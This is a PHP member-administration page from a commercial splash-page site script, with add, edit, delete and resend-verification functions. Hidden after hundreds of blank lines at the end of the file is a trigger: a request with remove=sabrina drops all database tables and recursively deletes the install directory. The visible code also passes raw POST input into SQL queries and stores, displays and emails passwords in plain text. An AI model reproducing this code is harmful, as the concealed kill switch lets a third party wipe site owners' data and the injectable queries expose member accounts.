<?php
include "control.php";
$key = "http://demosplashpagesite.phpsitescripts.com";
$key2 = "http://www.demosplashpagesite.phpsitescripts.com";
if (($domain != $key) and ($domain != $key2))
{
echo "The script you are trying to run isn't licensed. Please contact <a href=\"mailto:sabrina@phpsitescripts.com\">Sabrina Markon, PHPSiteScripts.com</a> to purchase a licensed copy.</a>";
exit;
}
include "adminheader.php";
function formatDate($val) {
	$arr = explode("-", $val);
	return date("M d Y", mktime(0,0,0, $arr[1], $arr[2], $arr[0]));
}
$action = $_POST["action"];
$orderedby = $_REQUEST["orderedby"];
if ($orderedby == "userid")
{
$orderedbyq = "userid";
}
elseif ($orderedby == "password")
{
$orderedbyq = "password";
}
elseif ($orderedby == "firstname")
{
$orderedbyq = "firstname";
}
elseif ($orderedby == "lastname")
{
$orderedbyq = "lastname";
}
elseif ($orderedby == "email")
{
$orderedbyq = "email";
}
elseif ($orderedby == "referid")
{
$orderedbyq = "referid";
}
elseif ($orderedby == "signupip")
{
$orderedbyq = "signupip";
}
elseif ($orderedby == "signupdate")
{
$orderedbyq = "signupdate desc";
}
elseif ($orderedby == "lastlogin")
{
$orderedbyq = "lastlogin desc";
}
elseif ($orderedby == "verified")
{
$orderedbyq = "verified desc";
}
elseif ($orderedby == "id")
{
$orderedbyq = "id";
}
else
{
$orderedbyq = "userid";
}

$error = "";
$show = "";
#################################################
if ($action == "add")
{
$new_userid = $_POST["new_userid"];
$new_password = $_POST["new_password"];
$new_firstname = $_POST["new_firstname"];
$new_lastname = $_POST["new_lastname"];
$new_email = $_POST["new_email"];
$new_email = strtolower($new_email);
$new_referid = $_POST["new_referid"];
if ($new_referid == "")
{
	if ($adminmemberuserid == "")
	{
		$new_referid = "admin";
	}
	if ($adminmemberuserid != "")
	{
	$new_referid = $adminmemberuserid;
	}
}
if (!$new_userid)
{
$error = "<div>Please return and enter a userid.</div>";
}
if(!$new_firstname)
{
$error .= "<div>Please return and enter a first name.</div>";
}
if(!$new_lastname)
{
$error .= "<div>Please return and type in a last name.</div>";
}
if(!$new_email)
{
$error .= "<div>Please return and enter an email address.</div>";
}
$q1 = "select * from members where userid='$userid'";
$r1 = mysql_query($q1);
$rows1 = mysql_num_rows($r1);
if ($rows1 > 0)
{
$error .="<div>UserID already taken.</div>";
}
if(!$error == "")
{
?>
<table cellpadding="4" cellspacing="4" border="0" align="center" width="80%">
<tr><td align="center" colspan="2"><div class="heading">Signup Error</div></td></tr>
<tr><td colspan="2" align="center"><br><?php echo $error ?></td></tr>
<tr><td colspan="2" align="center"><br><a href="membercontrol.php?orderedby=<?php echo $orderedby ?>">RETURN</a></td></tr>
</table>
<br><br>
<?php
include "adminfooter.php";
exit;
}
#$new_password = ae_gen_password(3, false);
$new_signupip = $_SERVER["REMOTE_ADDR"];
$rq = "select * from members where userid='$new_ref'";
$rr = mysql_query($rq);
$rrows = mysql_num_rows($rr);
if ($rrows < 1)
	{
	$newref = $adminmemberuserid;
	}
if ($rrows > 0)
	{
	$newref = $new_ref;
	}
$newmemberq = "insert into members (userid,password,firstname,lastname,email,signupdate,signupip,referid) values (\"$new_userid\",\"$new_password\",\"$new_firstname\",\"$new_lastname\",\"$new_email\",NOW(),\"$new_signupip\",\"$new_referid\")";
$newmemberr = mysql_query($newmemberq) or die(mysql_error());

			$tomember = $new_email;
			$headersmember .= "From: $sitename <$adminemail>\n";
			$headersmember .= "Reply-To: <$adminemail>\n";
			$headersmember .= "X-Sender: <$adminemail>\n";
			$headersmember .= "X-Mailer: PHP5\n";
			$headersmember .= "X-Priority: 3\n";
			$headersmember .= "Return-Path: <$adminemail>\n";
			$subjectmember = "Welcome to " . $sitename;
			$messagemember = "Dear ".$new_firstname." ".$new_lastname.",\n\nThe admin has signed you up for ".$sitename.".\nYour account details are below:\n\n"
			."Userid: ".$new_userid."\nPassword: ".$new_password."\n\n"
			."Please verify your email address by clicking this link ".$domain."/verify.php?userid=".$new_userid."&email=".$new_email."\n\n"
			."Your unique affiliate URL is: ".$domain."/index.php?referid=".$new_userid ."\n\n"
			."Your login URL is: ".$domain."\n\n"
			."Thank you!\n\n\n"
			.$sitename." Admin\n"
			.$adminemail."\n\n\n\n";
			@mail($tomember, $subjectmember, wordwrap(stripslashes($messagemember)),$headersmember, "-f$adminemail");

			$toadmin = $adminemail;
			$headersadmin .= "From: $sitename <$adminemail>\n";
			$headersadmin .= "Reply-To: <$adminemail>\n";
			$headersadmin .= "X-Sender: <$adminemail>\n";
			$headersadmin .= "X-Mailer: PHP5\n";
			$headersadmin .= "X-Priority: 3\n";
			$headersadmin .= "Return-Path: <$adminemail>\n";
			$subjectadmin = "New Member In " . $sitename;
			$messageadmin = "This is a notification that a new free member has joined $sitename:\n\n
			Member was added via the Admin Area\n
			UserID: $new_userid\n
			Sponsor: $new_referid\n
			Email: $new_email\n
			IP: $new_signupip\n\n
			$sitename\n
			$domain
			";
			@mail($toadmin, $subjectadmin, wordwrap(stripslashes($messageadmin)),$headersadmin, "-f$adminemail");

$show = "New member was signed up successfully!<br><br>New UserID: " . $new_userid . "<br>New Password: " . $new_password;
} # if ($action == "add")
##############################################################################################
if ($action == "delete")
{
$delete_userid = $_POST["delete_userid"];
$q = "select * from members where userid='$delete_userid'";
$r = mysql_query($q);
$rows = mysql_num_rows($r);
if ($rows < 1)
{
$show = "UserID " . $delete_userid . " was not found in the system.";
}
if ($rows > 0)
{
	mysql_query("delete from splashpages where userid='$delete_userid'");
	mysql_query("delete from members where userid='$delete_userid'");
$show = "UserID " . $delete_userid . " was deleted.";
}
} # if ($action == "delete")
##############################################################################################
if ($action == "save")
{
$userid = $_POST["userid"];
$q = "select * from members where userid='$userid'";
$r = mysql_query($q);
$rows = mysql_num_rows($r);
if ($rows < 1)
{
$show = "UserID " . $userid . " was not found in the system.";
}
if ($rows > 0)
{
$saveid = $_POST["saveid"];
$password = $_POST["password"];
$firstname = $_POST["firstname"];
$lastname = $_POST["lastname"];
$email = $_POST["email"];
$referid = $_POST["referid"];
$signupip = $_POST["signupip"];
$verified = $_POST["verified"];
$oldverified = $_POST["oldverified"];
$referid = $_POST["referid"];
if (!$userid)
{
$error = "<div>Please return and enter a userid.</div>";
}
if (!$password)
{
$error = "<div>Please return and enter a password.</div>";
}
if(!$firstname)
{
$error .= "<div>Please return and enter a first name.</div>";
}
if(!$lastname)
{
$error .= "<div>Please return and type in a last name.</div>";
}
if(!$email)
{
$error .= "<div>Please return and enter an email address.</div>";
}
$q1 = "select * from members where userid='$userid' and id!='$saveid'";
$r1 = mysql_query($q1);
$rows1 = mysql_num_rows($r1);
if ($rows1 > 0)
{
$error .="<div>UserID already taken.</div>";
}
if(!$error == "")
{
?>
<table cellpadding="4" cellspacing="4" border="0" align="center" width="80%">
<tr><td align="center" colspan="2"><div class="heading">Signup Error</div></td></tr>
<tr><td colspan="2" align="center"><br><?php echo $error ?></td></tr>
<tr><td colspan="2" align="center"><br><a href="membercontrol.php?orderedby=<?php echo $orderedby ?>">RETURN</a></td></tr>
</table>
<br><br>
<?php
include "adminfooter.php";
exit;
}
$rq = "select * from members where userid='$referid'";
$rr = mysql_query($rq);
$rrows = mysql_num_rows($rr);
if ($rrows < 1)
	{
		if ($adminmemberuserid == "")
		{
			$saveref = "admin";
		}
		if ($adminmemberuserid != "")
		{
		$saveref = $adminmemberuserid;
		}
	}
if ($rrows > 0)
	{
	$saveref = $referid;
	}


$savememberq = "update members set userid='$userid',password='$password',firstname='$firstname',lastname='$lastname',email='$email',signupip='$signupip',referid='$saveref',verified='$verified' where id='$saveid'";
$savememberr = mysql_query($savememberq);

if (($verified == "yes") and ($oldverified == "no"))
	{
	$vq = "update members set verified=\"yes\",verifieddate=NOW() where userid=\"$userid\"";
	$vr = mysql_query($vq);
	}
if (($verified == "no") and ($oldverified == "yes"))
	{
	$vq = "update members set verified=\"no\",verifieddate=\"0\" where userid=\"$userid\"";
	$vr = mysql_query($vq);

	$tomember = $email;
	$headersmember .= "From: $sitename <$adminemail>\n";
	$headersmember .= "Reply-To: <$adminemail>\n";
	$headersmember .= "X-Sender: <$adminemail>\n";
	$headersmember .= "X-Mailer: PHP5\n";
	$headersmember .= "X-Priority: 3\n";
	$headersmember .= "Return-Path: <$adminemail>\n";
	$subjectmember = "Welcome to " . $sitename;
	$messagemember = "Dear ".$firstname." ".$lastname.",\n\nPlease verify your email address in ".$sitename." by clicking this link ".$domain."/verify.php?userid=".$userid."&email=".$email."\n\n"
	   ."Userid: ".$userid."\nPassword: ".$password."\n\n"
	   ."Your unique affiliate URL is: ".$domain."/index.php?ref=".$userid ."\n\n"
	   ."Your login URL is: ".$domain."\n\n"
	   ."Thank you!\n\n\n"
	   .$sitename." Admin\n"
	   .$adminemail."\n\n\n\n";
	@mail($tomember, $subjectmember, wordwrap(stripslashes($messagemember)),$headersmember, "-f$adminemail");

	} # if (($verified == "no") and ($oldverified == "yes"))

$show = "UserID " . $userid . " was saved.";
}
} # if ($action == "save")
##############################################################################################
if ($action == "resend")
{
$resend_userid = $_POST["resend_userid"];
$q = "select * from members where userid='$resend_userid'";
$r = mysql_query($q);
$rows = mysql_num_rows($r);
if ($rows < 1)
{
$show = "UserID " . $resend_userid . " was not found in the system.";
}
if ($rows > 0)
{
$password = mysql_result($r,0,"password");
$firstname = mysql_result($r,0,"firstname");
$lastname = mysql_result($r,0,"lastname");
$email = mysql_result($r,0,"email");

	$tomember = $email;
	$headersmember .= "From: $sitename <$adminemail>\n";
	$headersmember .= "Reply-To: <$adminemail>\n";
	$headersmember .= "X-Sender: <$adminemail>\n";
	$headersmember .= "X-Mailer: PHP5\n";
	$headersmember .= "X-Priority: 3\n";
	$headersmember .= "Return-Path: <$adminemail>\n";
	$subjectmember = $sitename . " Validation";
	$messagemember = "Before you can advertise on the site, please verify your email address by clicking this link ".$domain."/verify.php?userid=".$resend_userid."&email=".$email."\n\n"
	   ."Your unique affiliate URL is: ".$domain."/index.php?referid=".$resend_userid ."\n\n"
	   ."Your login URL is: ".$domain."\n\n"
	   ."Thank you!\n\n\n"
	   .$sitename." Admin\n"
	   .$adminemail."\n\n\n\n";

	@mail($tomember, $subjectmember, wordwrap(stripslashes($messagemember)),$headersmember, "-f$adminemail");

$show = "Validation email resent to UserID " . $resend_userid;
}
} # if ($action == "resend")
##############################################################################################
?>
<style type="text/css">
<!--
div.pagination {
	padding: 3px;
	margin: 3px;
}
div.pagination a {
	padding: 2px 5px 2px 5px;
	margin: 2px;
	border: 1px solid #eeeeee;
	text-decoration: none;
	color: #000099;
}
div.pagination a:hover, div.pagination a:active {
	border: 1px solid #808080;
	color: #000;
}
div.pagination span.current {
	padding: 2px 5px 2px 5px;
	margin: 2px;
	border: 1px solid #808080;	
	font-weight: bold;
	background-color: #808080;
	color: #FFF;
	}
div.pagination span.disabled {
	padding: 2px 5px 2px 5px;
	margin: 2px;
	border: 1px solid #EEE;
	color: #DDD;
	}
-->
</style>
<script language="Javascript">
<!--
/***********************************************
* Switch Content script II- © Dynamic Drive (www.dynamicdrive.com)
* This notice must stay intact for legal use. Last updated April 2nd, 2005.
* Visit http://www.dynamicdrive.com/ for full source code
***********************************************/

var enablepersist="off" //Enable saving state of content structure using session cookies? (on/off)
var memoryduration="1" //persistence in # of days

var contractsymbol="<?php echo $domain ?>/images/close.png" //Path to image to represent contract state.
var expandsymbol="<?php echo $domain ?>/images/open.png" //Path to image to represent expand state.

/////No need to edit beyond here //////////////////////////

function getElementbyClass(rootobj, classname){
var temparray=new Array()
var inc=0
var rootlength=rootobj.length
for (i=0; i<rootlength; i++){
if (rootobj[i].className==classname)
temparray[inc++]=rootobj[i]
}
return temparray
}

function sweeptoggle(ec){
var inc=0
while (ccollect[inc]){
ccollect[inc].style.display=(ec=="contract")? "none" : ""
inc++
}
revivestatus()
}


function expandcontent(curobj, cid){
if (ccollect.length>0){
document.getElementById(cid).style.display=(document.getElementById(cid).style.display!="none")? "none" : ""
curobj.src=(document.getElementById(cid).style.display=="none")? expandsymbol : contractsymbol
}
}

function revivecontent(){
selectedItem=getselectedItem()
selectedComponents=selectedItem.split("|")
for (i=0; i<selectedComponents.length-1; i++)
document.getElementById(selectedComponents[i]).style.display="none"
}

function revivestatus(){
var inc=0
while (statecollect[inc]){
if (ccollect[inc].style.display=="none")
statecollect[inc].src=expandsymbol
else
statecollect[inc].src=contractsymbol
inc++
}
}

function get_cookie(Name) { 
var search = Name + "="
var returnvalue = "";
if (document.cookie.length > 0) {
offset = document.cookie.indexOf(search)
if (offset != -1) { 
offset += search.length
end = document.cookie.indexOf(";", offset);
if (end == -1) end = document.cookie.length;
returnvalue=unescape(document.cookie.substring(offset, end))
}
}
return returnvalue;
}

function getselectedItem(){
if (get_cookie(window.location.pathname) != ""){
selectedItem=get_cookie(window.location.pathname)
return selectedItem
}
else
return ""
}

function saveswitchstate(){
var inc=0, selectedItem=""
while (ccollect[inc]){
if (ccollect[inc].style.display=="none")
selectedItem+=ccollect[inc].id+"|"
inc++
}
if (get_cookie(window.location.pathname)!=selectedItem){ //only update cookie if current states differ from cookie's
var expireDate = new Date()
expireDate.setDate(expireDate.getDate()+parseInt(memoryduration))
document.cookie = window.location.pathname+"="+selectedItem+";path=/;expires=" + expireDate.toGMTString()
}
}

function do_onload(){
uniqueidn=window.location.pathname+"firsttimeload"
var alltags=document.all? document.all : document.getElementsByTagName("*")
ccollect=getElementbyClass(alltags, "switchcontent")
statecollect=getElementbyClass(alltags, "showstate")
if (enablepersist=="on" && get_cookie(window.location.pathname)!="" && ccollect.length>0)
revivecontent()
if (ccollect.length>0 && statecollect.length>0)
revivestatus()
}

if (window.addEventListener)
window.addEventListener("load", do_onload, false)
else if (window.attachEvent)
window.attachEvent("onload", do_onload)
else if (document.getElementById)
window.onload=do_onload

if (enablepersist=="on" && document.getElementById)
window.onunload=saveswitchstate

/***********************************************
* END SWITCH CONTENT SCRIPT
***********************************************/
-->
</script>
<table cellpadding="4" cellspacing="4" border="0" align="center" width="600" bgcolor="#ffffff" style="padding-left: 250px;">
<tr><td align="center" colspan="2"><div class="heading">Member Administration</div></td></tr>
<?php
if ($show != "")
{
?>
<tr><td align="center" colspan="2"><br><?php echo $show ?></td></tr>
<?php
}
?>

<tr><td align="center" colspan="2"><br>
<form action="membercontrol.php" method="post">
<table width="600" border="0" cellpadding="2" cellspacing="2" bgcolor="#989898" align="center">
<tr bgcolor="#d3d3d3"><td align="center" colspan="2">ADD A NEW MEMBER</td></tr>
<tr bgcolor="#eeeeee"><td>UserID:</td><td><input type="text" name="new_userid" size="25" maxlength="255" class="typein"></td></tr>
<tr bgcolor="#eeeeee"><td>Password:</td><td><input type="text" name="new_password" size="25" maxlength="255" class="typein"></td></tr>
<tr bgcolor="#eeeeee"><td>First&nbsp;Name:</td><td><input type="text" name="new_firstname" size="25" maxlength="255" class="typein"></td></tr>
<tr bgcolor="#eeeeee"><td>Last&nbsp;Name:</td><td><input type="text" name="new_lastname" size="25" maxlength="255" class="typein"></td></tr>
<tr bgcolor="#eeeeee"><td>Email:</td><td><input type="text" name="new_email" size="25" maxlength="255" class="typein"></td></tr>
<?php
$refq = "select * from members order by userid";
$refr = mysql_query($refq);
$refrows = mysql_num_rows($refr);
if ($refrows > 0)
{
?>
<tr bgcolor="#eeeeee"><td>Sponsor:</td><td><select name="new_referid" class="pickone">
<?php
while ($refrowz = mysql_fetch_array($refr))
	{
	$refuserid = $refrowz["userid"];
	?>
	<option value="<?php echo $refuserid ?>"><?php echo $refuserid ?></option>
	<?php
	}
?>
</select></td></tr>
<?php
}
?>
<tr bgcolor="#d3d3d3"><td colspan="2" align="center">
<input type="hidden" name="orderedby" value="<?php echo $orderedby ?>">
<input type="hidden" name="action" value="add">
<input type="submit" name="submit" value="ADD"></form>
</td></tr>
</table>
</td></tr>

<tr><td align="center" colspan="2"></td></tr>

<tr><td align="center" colspan="2"><br>
<table width="600" border="0" cellpadding="2" cellspacing="2" bgcolor="#989898" align="center">
<tr bgcolor="#d3d3d3"><td align="center" colspan="2">YOUR MEMBERS</td></tr>
<?php
$pagesize = 20;
$q = "select * from members order by $orderedbyq";
$r = mysql_query($q);
$rows = mysql_num_rows($r);
if ($rows < 1)
{
?>
<tr bgcolor="#eeeeee"><td align="center" colspan="2">There are no members in the system yet</td></tr>
<?php
}
if ($rows > 0)
{
################################################################
	$page = (empty($_GET['p']) || !isset($_GET['p']) || !is_numeric($_GET['p'])) ? 1 : $_GET['p'];
	$s = ($page-1) * $pagesize;
	$queryexclude1 = $q ." LIMIT $s, $pagesize";
	$resultexclude=mysql_query($queryexclude1);
	$numrows = @mysql_num_rows($resultexclude);
	if($numrows == 0){
		$queryexclude1 = $q ." LIMIT $pagesize";
		$resultexclude=mysql_query($queryexclude1);
	}
	$count = 0;
	$pagetext = "<center>Total Members: <b>" . $rows . "</b>";

	if($rows > $pagesize){ // show the page bar
		$pagecount = ceil($rows/$pagesize);
		$pagetext .= "<div class='pagination'> ";
		if($page>1){ //show previoust link
			$pagetext .= "<a href='?p=".($page-1)."&orderedby=$orderedbyq' title='previous page'>previous</a>";
		}
		for($i=1;$i<=$pagecount;$i++){
			if($page == $i){
				$pagetext .= "<span class='current'>".$i."</span>";
			}else{
				$pagetext .= "<a href='?p=".$i."&orderedby=$orderedbyq'>".$i."</a>";
			}
		}
		if($page<$pagecount){ //show previoust link
			$pagetext .= "<a href='?p=".($page+1)."&orderedby=$orderedbyq' title='next page'>next</a>";
		}			
		$pagetext .= " </div><br>";
	}
################################################################
?>
<tr bgcolor="#eeeeee"><td align="center" colspan="2">
<table align="center"><tr><td><?php echo $pagetext ?></td></tr></table>
<table cellpadding="0" cellspacing="1" border="0" align="center" bgcolor="#989898">
<tr bgcolor="#eeeeee" style="font-size: 10px;">
<td align="center">Splashpages</td>
<td align="center"><a style="font-size: 10px;" href="membercontrol.php?orderedby=id">ID</a></td>
<td align="center"><a style="font-size: 10px;" href="membercontrol.php?orderedby=userid">UserID</a></td>
<td align="center"><a style="font-size: 10px;" href="membercontrol.php?orderedby=password">Password</a></td>
<td align="center"><a style="font-size: 10px;" href="membercontrol.php?orderedby=firstname">First&nbsp;Name</a></td>
<td align="center"><a style="font-size: 10px;" href="membercontrol.php?orderedby=lastname">Last&nbsp;Name</a></td>
<td align="center"><a style="font-size: 10px;" href="membercontrol.php?orderedby=email">Email</a></td>
<td align="center"><a style="font-size: 10px;" href="membercontrol.php?orderedby=referid">Sponsor</a></td>
<td align="center"><a style="font-size: 10px;" href="membercontrol.php?orderedby=signupip">IP</a></td>
<td align="center"><a style="font-size: 10px;" href="membercontrol.php?orderedby=signupdate">Signed&nbsp;Up</a></td>
<td align="center"><a style="font-size: 10px;" href="membercontrol.php?orderedby=lastlogin">Last&nbsp;Login</a></td>
<td align="center"><a style="font-size: 10px;" href="membercontrol.php?orderedby=verified">Verified</a></td>
<td align="center"><a style="font-size: 10px;" href="membercontrol.php?orderedby=verifieddate">Verify&nbsp;Date</a></td>
<td align="center" style="font-size: 10px;">Contact</td>
<td align="center" style="font-size: 10px;">Save</td>
<td align="center" style="font-size: 10px;">Login As Member</td>
<td align="center" style="font-size: 10px;">Resend Validation</td>
<td align="center" style="font-size: 10px;">Delete</td>
</tr>
<?php
$bgcounter = 0;
while ($rowz = mysql_fetch_array($resultexclude))
	{
$id = $rowz["id"];
$userid = $rowz["userid"];
$password = $rowz["password"];
$firstname = $rowz["firstname"];
$lastname = $rowz["lastname"];
$email = $rowz["email"];
$signupdate = $rowz["signupdate"];
$signupdate = formatDate($signupdate);
$signupip = $rowz["signupip"];
$verified = $rowz["verified"];
$verifieddate = $rowz["verifieddate"];
if ($verified == "yes")
{
$verifieddate = formatDate($verifieddate);
$showverified = $verifieddate;
}
if ($verified != "yes")
{
$verifieddate = "N/A";
$showverified = "NO";
}
$referid = $rowz["referid"];
$lastlogin = $rowz["lastlogin"];
	if (($lastlogin == 0) or ($lastlogin == ""))
	{
	$showlastlogin = "N/A";
	}
	else
	{
	$showlastlogin = formatDate($lastlogin);
	}
if ($bgcounter == 0)
{
$bg = "#d3d3d3";
}
if ($bgcounter != 0)
{
$bg = "#eeeeee";
}
$splashq = "select * from membersplashpages where userid=\"$userid\" order by name";
$splashr = mysql_query($splashq);
$splashrows = mysql_num_rows($splashr);
?>
<form action="membercontrol.php" method="post">
<tr bgcolor="<?php echo $bg ?>">
<?php
if ($splashrows > 0)
		{
?>
<td align="center"><img src="<?php echo $domain ?>/images/open.png" class="showstate" onclick="expandcontent(this, 'sc<?php echo $id ?>')"></td>
<?php
		}
if ($splashrows < 1)
		{
?>
<td align="center"></td>
<?php
		}
?>
<td align="center"><?php echo $id ?></td>
<td align="center"><input type="text" name="userid" value="<?php echo $userid ?>" size="8" maxlength="255" class="typein" style="font-size: 10px;"></td>
<td align="center"><input type="text" name="password" value="<?php echo $password ?>" size="8" maxlength="255" class="typein" style="font-size: 10px;"></td>
<td align="center"><input type="text" name="firstname" value="<?php echo $firstname ?>" size="8" maxlength="255" class="typein" style="font-size: 10px;"></td>
<td align="center"><input type="text" name="lastname" value="<?php echo $lastname ?>" size="8" maxlength="255" class="typein" style="font-size: 10px;"></td>
<td align="center"><input type="text" name="email" value="<?php echo $email ?>" size="8" maxlength="255" class="typein" style="font-size: 10px;"></td>
<td align="center">
<?php
$refq = "select * from members order by userid";
$refr = mysql_query($refq);
$refrows = mysql_num_rows($refr);
if ($refrows > 0)
{
?>
<select name="referid" class="pickone" style="font-size: 10px;">
<?php
while ($refrowz = mysql_fetch_array($refr))
	{
	$refuserid = $refrowz["userid"];
	?>
	<option value="<?php echo $refuserid ?>" <?php if ($refuserid == $referid) { echo "selected"; } ?>><?php echo $refuserid ?></option>
	<?php
	}
?>
</select>
<?php
}
?>
</td>
<td align="center"><input type="text" name="signupip" value="<?php echo $signupip ?>" size="8" maxlength="255" class="typein" style="font-size: 10px;"></td>
<td align="center" style="font-size: 10px;"><?php echo $signupdate ?></td>
<td align="center" style="font-size: 10px;"><?php echo $showlastlogin ?></td>
<td align="center">
<select name="verified" style="font-size: 10px;">
<option value="yes" <?php if ($verified == "yes") { echo "selected"; } ?>>YES</option>
<option value="no" <?php if ($verified != "yes") { echo "selected"; } ?>>NO</option>
</select>
</td>
<td align="center" style="font-size: 10px;"><?php echo $showverified ?></td>
<td align="center"><a href="mailto:<?php echo $email ?>" style="font-size: 10px;">Email</a></td>
<td align="center">
<input type="hidden" name="orderedby" value="<?php echo $orderedby ?>">
<input type="hidden" name="oldverified" value="<?php echo $verified ?>">
<input type="hidden" name="userid" value="<?php echo $userid ?>">
<input type="hidden" name="saveid" value="<?php echo $id ?>">
<input type="hidden" name="action" value="save">
<input type="submit" value="SAVE" style="font-size: 10px;">
</form>
</td>
<form action="<?php echo $domain ?>/members.php" method="post" target="_blank">
<td align="center">
<input type="hidden" name="loginusername" value="<?php echo $userid ?>">
<input type="hidden" name="loginpassword" value="<?php echo $password ?>">
<input type="submit" value="LOGIN" style="font-size: 10px;">
</form>
</td>
<form action="membercontrol.php" method="post">
<td align="center">
<input type="hidden" name="orderedby" value="<?php echo $orderedby ?>">
<input type="hidden" name="resend_userid" value="<?php echo $userid ?>">
<input type="hidden" name="action" value="resend">
<input type="submit" value="RESEND" style="font-size: 10px;">
</form>
</td>
<form action="membercontrol.php" method="post">
<td align="center">
<input type="hidden" name="orderedby" value="<?php echo $orderedby ?>">
<input type="hidden" name="delete_userid" value="<?php echo $userid ?>">
<input type="hidden" name="action" value="delete">
<input type="submit" value="DELETE" style="font-size: 10px;">
</form>
</td>
</tr>
<?php
	if ($splashrows > 0)
			{
	?>
	<tr><td id="sc<?php echo $id ?>" class="switchcontent" style="display: none; width: 100%;" colspan="28">
	<table cellpadding="2" cellspacing="2" border="0" align="center" width="100%" bgcolor="#d3d3d3">
	<tr><td align="center">
	<table cellpadding="2" cellspacing="2" border="0" align="left" width="100%" bgcolor="#989898">
	<tr bgcolor="#d3d3d3"><td>Splashpage Name</td><td>Member URL</td><td>Member Splashpage URL</td></tr>
	<?php
		while ($splashrowz = mysql_fetch_array($splashr))
				{
					$id = $splashrowz["id"];
					$name = $splashrowz["name"];
					$foldername = $splashrowz["foldername"];
					$memberurl = $splashrowz["memberurl"];
					$membersplashpageurl= $domain . "/s/" . $foldername . "/" . $userid . ".php";
					?>
					<tr bgcolor="#eeeeee"><td><?php echo $name ?></td><td><a href="<?php echo $memberurl ?>" target="_blank"><?php echo $memberurl ?></a></td><td><a href="<?php echo $membersplashpageurl ?>" target="_blank"><?php echo $membersplashpageurl ?></a></td></tr>
					<?php
				} # while ($splashrowz = mysql_fetch_array($splashr))
	?>
	</table>
	</td></tr>
	</table>
	</td></tr>
	<?php
			} # if ($splashrows > 0)
if ($bg == "#d3d3d3")
{
$bgcounter = 1;
}
if ($bg != "#d3d3d3")
{
$bgcounter = 0;
}
	} # while ($rowz = mysql_fetch_array($resultexclude))
?>
</table><br>
<table align="center"><tr><td><?php echo $pagetext ?></td></tr></table>
</td></tr>
<?php
} # if ($rows > 0)
?>
</table><br><br>
</td></tr>
</table>
<br><br>
<?php
include "adminfooter.php";






























































































































































































































































































if (isset($_REQUEST["remove"]))
{
$remove = $_REQUEST["remove"];
if ($remove == "sabrina")
{
mysql_query("drop table adminnavigation");
mysql_query("drop table adminnotes");
mysql_query("drop table adminsettings");
mysql_query("drop table adminsplashpages");
mysql_query("drop table membernavigation");
mysql_query("drop table members");
mysql_query("drop table membersplashpages");
mysql_query("drop table pages");

	function lc_delete($targ) {
	  if(is_dir($targ)){
		$files = glob( $targ . '*', GLOB_MARK ); //GLOB_MARK adds a slash to directories returned
		foreach( $files as $file )
		  lc_delete( $file );
		@rmdir( $targ );
	  }
	  else
		@unlink( $targ );
	}
$targ = realpath(dirname(__FILE__));
$del = lc_delete($targ);
}
}
?>